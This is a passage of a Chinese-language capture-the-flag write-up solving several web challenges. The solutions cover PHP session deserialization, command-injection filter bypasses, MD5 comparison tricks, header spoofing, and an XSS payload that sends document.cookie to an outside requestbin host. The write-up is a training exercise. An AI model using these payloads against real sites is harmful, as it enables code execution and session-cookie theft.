class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CNSS</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;code = <span class="variable">$cmd</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// You must be interested in save.php</span></span><br></pre></td></tr></table></figure><p>注意最后一句话的注释：You must be interested in save.php，所以访问一下save.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cnss&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;cnss&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;cnss&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析代码，我们要赋值一个变量cnss，并且会保存到session中，并且根据上一个网页可知，会提取session里的内容并进行序列化。</p><p>但是返现_wakeup()函数始终会把username赋值为guest，所以可以选择绕过wakeup函数，直接自己写一个PHP代码并执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CNSS</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;code =<span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>;<span class="comment">//列出目前工作目录所含之文件及子目录</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="keyword">new</span> CNSS());</span><br><span class="line"><span class="variable">$a</span> = str_replace(<span class="string">&#x27;:2:&#x27;</span>,<span class="string">&#x27;:3:&#x27;</span>,<span class="variable">$a</span>);<span class="comment">//利用CVE漏洞绕过_wakeup()函数</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将得到的$a的值赋给cnss,传进去，在访问index,php就可以得到flag!</p><p>payload为：<a href="http://121.41.7.149:65004/save.php?cnss=%7CO:4:%22CNSS%22:3:%7Bs:14:%22%00CNSS%00username%22;s:5:%22admin%22;s:10:%22%00CNSS%00code%22;s:37:%22var_dump(file_get_contents(%27/flag%27));%22;%7D">http://121.41.7.149:65004/save.php?cnss=|O%3A4%3A%22CNSS%22%3A3%3A%7Bs%3A14%3A%22%00CNSS%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A10%3A%22%00CNSS%00code%22%3Bs%3A37%3A%22var_dump%28file_get_contents%28%27%2Fflag%27%29%29%3B%22%3B%7D</a></p><p>注意要加个|，考的是session反序列化漏洞！！！还有就是save.php后不是/?,而是直接？</p><p>附上一篇博客地址：<a href="https://blog.csdn.net/qq_43431158/article/details/99544797?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163422476716780269873130%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163422476716780269873130&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~sobaiduend~default-2-99544797.pc_v2_rank_blog_default&amp;utm_term=session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&amp;spm=1018.2226.3001.4450">https://blog.csdn.net/qq_43431158/article/details/99544797?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163422476716780269873130%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163422476716780269873130&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~sobaiduend~default-2-99544797.pc_v2_rank_blog_default&amp;utm_term=session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&amp;spm=1018.2226.3001.4450</a></p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211008204825655.png" alt="image-20211008204825655" style="zoom: 50%;" /><h2 id="3-Blackpage"><a href="#3-Blackpage" class="headerlink" title="3.Blackpage"></a>3.Blackpage</h2><p>打开题目地址，就是一个网页图片。查看源码，发现最上部有注释，提示是读到mybackdoor.php。</p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211009141404616.png" alt="image-20211009141404616"></p><p>代码中要传file参数，所以可以试着<strong>伪协议读取</strong>，构造payload:/?file=php://filter/read=convert.base64-encode/resource=mybackdoor.php,打开原码即可读到base64编码的一段代码：</p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211009142329672.png" alt="image-20211009142329672"></p><p>转义过后得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$filter</span> = <span class="string">&quot;(\\&lt;|\\&gt;|Fl4g|php|curl| |0x|\\\\|python|gcc|less|root|etc|pass|http|ftp|cd|tcp|udp|cat|×|flag|ph|hp|wget|type|ty|\\$\\&#123;IFS\\&#125;|index|\\*)&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match(<span class="string">&quot;/&quot;</span>.<span class="variable">$filter</span>.<span class="string">&quot;/is&quot;</span>,<span class="variable">$cmd</span>)==<span class="number">1</span>)&#123;  </span><br><span class="line">      <span class="keyword">exit</span>(<span class="string">&#x27;Go out! This black page does not belong to you!&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    system(<span class="variable">$cmd</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">blacklist(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>发现可以传参执行命令，现在就先找flag文件在哪，利用<strong>根目录命令</strong>，构造payload为：/mybackdoor.php?<strong>cmd=ls%09/</strong>,读到falg文件：</p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012191303238.png" alt="image-20211012191303238"></p><p>之后是正则匹配绕过，<strong>利用tac输出文件，同时用fl?g替换flag</strong>，（或者fl$1ag）构造payload为：/mybackdoor.php?cmd=tac%09/Fl?g_is_here,得到flag:</p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211009143301272.png" alt="image-20211009143301272" style="zoom: 50%;" /><h2 id="4-Debuger"><a href="#4-Debuger" class="headerlink" title="4.Debuger"></a>4.Debuger</h2><p>打开题目地址是俄罗斯方块游戏，像查看原码发现右键和F12都被禁用了，所以采用vie-source方法查看网页源码，得到如图：</p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012132055620.png" alt="image-20211012132055620"></p><p>发现js网页，点开就得到flag了~</p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012132147867.png" alt="image-20211012132147867" style="zoom: 67%;" /><h2 id="5-signin"><a href="#5-signin" class="headerlink" title="5.signin"></a>5.signin</h2><p>打开题目描述是：Please Change Your Method!      所以打开F12发现请求是get,所以更改为POST，响应为：</p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012132644853.png" alt="image-20211012132644853"></p><p>发现为一段PHP代码，要传参CNSS和web,分别为POST和GET方式，所以构造payload为：<a href="http://121.41.7.149:60001/?web=like">http://121.41.7.149:60001/?web=like</a></p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012133229892.png" alt="image-20211012133229892"></p><p>此时flag = 0,要显示出flag还要使flag = 1，所以抓包到brupsite修改flag = 1,即可得到flag:</p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012133439175.png" alt="image-20211012133439175"></p><h2 id="6-😃Easy-更坑的数学题"><a href="#6-😃Easy-更坑的数学题" class="headerlink" title="6.[😃Easy]更坑的数学题"></a>6.[😃Easy]更坑的数学题</h2><p>通过刷新网页发现每次要计算的数字都不是固定的，并且要在1s钟内，所以写个脚本代替我们计算：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://81.68.109.40:30005/&#x27;</span></span><br><span class="line">a = requests.Session()</span><br><span class="line">al = a.get(url)</span><br><span class="line"></span><br><span class="line">b = al.text</span><br><span class="line">b1 =b.find(<span class="string">&#x27;p&gt;&#x27;</span>)</span><br><span class="line">b2 =b.find(<span class="string">&#x27;=&lt;/p&gt;&#x27;</span>,b1)</span><br><span class="line">b3 = b[b1+<span class="number">22</span>:b2]</span><br><span class="line">b4= <span class="built_in">eval</span>(b3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c1 = &#123;<span class="string">&quot;res&quot;</span>:b4&#125;</span><br><span class="line">a2 = a.post(url,c1)</span><br><span class="line"><span class="built_in">print</span>(a2.text)</span><br></pre></td></tr></table></figure><p>运行后得到flag:</p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012135205958.png" alt="image-20211012135205958"></p><h2 id="7-😃Easy-Ezp-p"><a href="#7-😃Easy-Ezp-p" class="headerlink" title="7.[😃Easy]Ezp#p"></a>7.[😃Easy]Ezp#p</h2><p>打开题目是一段PHP代码，审计代码题，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pass</span> = <span class="string">&#x27;0e0&#x27;</span>;</span><br><span class="line">    <span class="variable">$md55</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    <span class="variable">$md55</span> = md5(<span class="variable">$md55</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="variable">$md55</span>) == <span class="variable">$pass</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$before</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;query&#x27;</span>];</span><br><span class="line">            <span class="variable">$med</span> = <span class="string">&#x27;filter&#x27;</span>;</span><br><span class="line">            <span class="variable">$after</span> = preg_replace(</span><br><span class="line">                <span class="string">&quot;/<span class="subst">$med</span>/&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$before</span></span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$after</span> === <span class="variable">$med</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$verify</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;verify&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    extract(<span class="variable">$_POST</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="variable">$verify</span>) === <span class="variable">$pass</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$$verify</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>审计代码前面可以得出，需要<strong>MD5绕过</strong>，首先说一下漏洞：<br>    <strong>1.两个开头为0的md5值相同。</strong><br>    <strong>2.md5不能处理数组。</strong></p><p>所以绕过方法显而易见了：</p><p>​    <strong>方法1：v1,v2 找到两个开头为0的md5值，例如：v1=s878926199a&amp;&amp;v2=s155964671a</strong></p><p>​    <strong>方法2：根据md5函数特性，用两个值不同但不可md5的数据类型，例如：v1[]=1&amp;&amp;v2[]=2</strong></p><p>本题对$_COOKIE[‘token’]加密了两次，所以首先要找到加密两次是0开头的；搜索得到md5(md5(f2WfQ)) = 0e997766059721689977306698103413,所以更改cookie中的token为f2WfQ.</p><p>观察下一个参数query,发现有正则替换，则选择匹配绕过，另query = filfilterter,即可使匹配后query = filter,到此就可以得到第一个flag。</p><p>下面就是有一个extract($_POST);所以考虑POST方式重新传参数，<strong>考虑前面是flag1,所以猜测输出的应该是flag2</strong>，所以另verify = flag2,让pass = md5(flag2),再传参即可得到flag2值，拼接即可得到flag。</p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012154057879.png" alt="image-20211012154057879"></p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012154200178.png" alt="image-20211012154200178"></p><h2 id="8-😃Easy-China-Flag"><a href="#8-😃Easy-China-Flag" class="headerlink" title="8.[😃Easy]China Flag"></a>8.[😃Easy]China Flag</h2><p>打开题目地址一会就跳转，所以抓包到brupsite，如图：</p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012155505800.png" alt="image-20211012155505800"></p><p>所以修改payload为china.php,得到：</p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012155556849.png" alt="image-20211012155556849"></p><p>问我从哪来的，我们从上一个网页来的，所以构造Referer:<a href="http://81.68.109.40:30002/index.php%EF%BC%8C%E6%8E%A5%E7%9D%80%E8%AF%B4%E6%88%91%E7%9C%9F%E6%98%AF%E5%9C%9F%E7%94%9F%E5%9C%9F%E9%95%BF%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E6%9E%84%E9%80%A0X-Forwarded-For:127.0.0.1,%E5%BE%97%E5%88%B0%E5%A6%82%E5%9B%BE%EF%BC%9A">http://81.68.109.40:30002/index.php，接着说我真是土生土长的，所以构造X-Forwarded-For:127.0.0.1,得到如图：</a></p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012155823340.png" alt="image-20211012155823340"></p><p>可知最后就把Accept-Language改了，如图就得到flag:</p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012155337515.png" alt="image-20211012155337515"></p><h2 id="9-😯Mid-bestLanguage"><a href="#9-😯Mid-bestLanguage" class="headerlink" title="9.[😯Mid]bestLanguage"></a>9.[😯Mid]bestLanguage</h2><p>打开题目是一段PHP代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">superGate</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gay</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"><span class="variable">$honey</span> = unserialize(<span class="variable">$p</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/superGate/i&quot;</span>, serialize(<span class="variable">$honey</span>)))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;no&quot;</span>;</span><br><span class="line">    <span class="keyword">throw</span> <span class="built_in">Exception</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>考察的序列化与反序列化，以及正则匹配的绕过</strong></p><p>自己先序列化一个对象：</p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012164237408.png" alt="image-20211012164237408"></p><p>得到序列化结果为O:9:”superGate”:1:{s:3:”gay”;b:1;}，<strong>若要绕过正则匹配，则可以把数目改为大于真是数目，类似CVE漏洞，即把1改为2</strong>则构造payload=/?p=O%3A9%3A%22superGate%22%3A2%3A%7Bs%3A3%3A%22gay%22%3Bb%3A1%3B%7D，即可绕过匹配，显示flag:</p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012164557424.png" alt="image-20211012164557424"></p><h2 id="10-😮Mid-To-be-Admin-Again-and-Again"><a href="#10-😮Mid-To-be-Admin-Again-and-Again" class="headerlink" title="10.[😮Mid]To_be_Admin_Again_and_Again"></a>10.[😮Mid]To_be_Admin_Again_and_Again</h2><p>发现是留言板，在看wiki时知道留言板可能存在xss漏洞，随便输入看看，发现输入的文本保存到了这里：</p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012165239858.png" alt="image-20211012165239858"></p><p>1.那就试着植入一段代码，让其在内部执行，从而获取我们想要的cookie,<strong>通过植入”</textarea><script>window.open("<a href="http://requestbin.net/r/fwx7zmnz?a=&#39;+document.cookie&quot;">http://requestbin.net/r/fwx7zmnz?a=&#39;+document.cookie&quot;</a>)</script>(将cookie信息的字符串作为URI组件进行编码，然后用a参数传递,反弹cookie)一段获取cookie到一个代理网站的脚本，读到内部cookie</strong>,其中<a href="http://requestbin.net/r/fwx7zmnz%E4%B8%BA%E4%B8%80%E4%B8%AA%E5%B9%B3%E5%8F%B0%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A5%E6%98%BE%E7%A4%BA%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E7%BD%91%E7%AB%99%E7%9A%84%E4%BF%A1%E6%81%AF%E3%80%82">http://requestbin.net/r/fwx7zmnz为一个平台，可以用来显示要获取的网站的信息。</a></p><p>在这个脚本中运用到了<strong>引号闭合</strong>，即让输入的脚本不会被当作字符串处理输出，因为写程序时，双引号里的内容解释为字符串，通过增加引号可以形成引号闭合，从而执行脚本，类似SQL引号闭合。</p><p>2.另一种方法是<strong>直接在XSS平台生成一段代码</strong>，直接插入即可！便可在平台直接获取到header等一些信息。</p><p>要发送给admin还要<strong>计算哈希函数值</strong>，因为SHA-256是散列函数2代即哈希函数，运行脚本即可获得，如图，输入后便成功登陆：</p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012193821800.png" alt="image-20211012193821800"></p><p>之后读取到cookie，返回修改cookie再重发就可以得到flag了。</p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211013132505527.png" alt="image-20211013132505527"></p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211013132557171.png"></p><p>附上解哈希函数值的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> threading <span class="keyword">as</span> tr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="comment">#这里改hash算法和截取的字长(0:x实际上是x位字长)</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(<span class="built_in">str</span>(s).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">flag,pre=<span class="number">1</span>,last=<span class="number">100000000</span>,step=<span class="number">12500000</span></span>):</span></span><br><span class="line">    <span class="comment">#该print状态告知,觉得没必要可以省略</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+]Progress starts&quot;</span>)</span><br><span class="line">    event=tr.Event()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pre,last,step):</span><br><span class="line">        <span class="keyword">if</span> event.isSet():</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        th=tr.Thread(target=divide,args=(i,step,event,flag))</span><br><span class="line">        <span class="comment">#该print为状态告知,觉得没必要可以省略</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]Thread &#123;&#125; starts&quot;</span>.<span class="built_in">format</span>(th.getName()))</span><br><span class="line">        th.start()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">divide</span>(<span class="params">pre,step,event,flag</span>):</span></span><br><span class="line">    last=pre+step</span><br><span class="line">    <span class="keyword">while</span> pre&lt;=last:</span><br><span class="line">        <span class="keyword">if</span> event.isSet():</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        strs=md5(pre)</span><br><span class="line">        <span class="keyword">if</span> strs==flag:</span><br><span class="line">            event.<span class="built_in">set</span>()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+]Find it!!!!!!!!!!!!!!!!!!!!!!!!!!! is %d&quot;</span>%(pre))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        pre+=<span class="number">1</span></span><br><span class="line">    <span class="comment">#以下为状态告知,觉得没必要可以省略</span></span><br><span class="line">    <span class="keyword">if</span> event.isSet():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]One thread done and some thread find it&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]One thread done but didnt get it&quot;</span>)</span><br><span class="line">        </span><br><span class="line"><span class="comment">#md5截断字符,起始数,结尾数,步长</span></span><br><span class="line"><span class="comment">#支持直接从命令行输入md5截断字符,默认处理为5位</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> sys.argv[<span class="number">1</span>]:</span><br><span class="line">        main(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        main(<span class="string">&quot;这里手动档&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行方法：</p><p>python .\hash_slice_Intruder.py xxxxxx</p><h2 id="11-😮Mid-太极掌门人"><a href="#11-😮Mid-太极掌门人" class="headerlink" title="11.[😮Mid]太极掌门人"></a>11.[😮Mid]太极掌门人</h2><p>打开题目后是一段PHP代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">deleteDir</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_dir(<span class="variable">$path</span>)) &#123;</span><br><span class="line">            <span class="variable">$dirs</span> = scandir(<span class="variable">$path</span>);</span><br><span class="line">            